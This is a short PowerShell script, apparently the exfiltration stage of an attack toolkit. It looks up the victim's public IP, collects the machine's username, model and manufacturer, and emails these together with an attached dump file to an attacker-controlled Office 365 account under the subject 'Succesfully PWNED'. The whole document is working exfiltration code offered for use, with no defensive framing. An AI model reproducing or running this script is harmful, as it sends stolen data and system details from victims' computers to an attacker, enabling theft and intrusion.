param (
    [Parameter()]
    [String]$Username,
    [String]$Password,
    [String]$dump_file_name
)

$ip = Invoke-RestMethod "myexternalip.com/raw"
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = $UserName
$ReportEmail.To.Add($UserName)
$ReportEmail.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ReportEmail.Body = $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$ReportEmail.Attachments.Add("$dump_file_name")

$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.office365.com', 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($UserName, $Password)
$SMTPInfo.Send($ReportEmail)

$ReportEmail.Dispose()
$SMTPInfo.Dispose()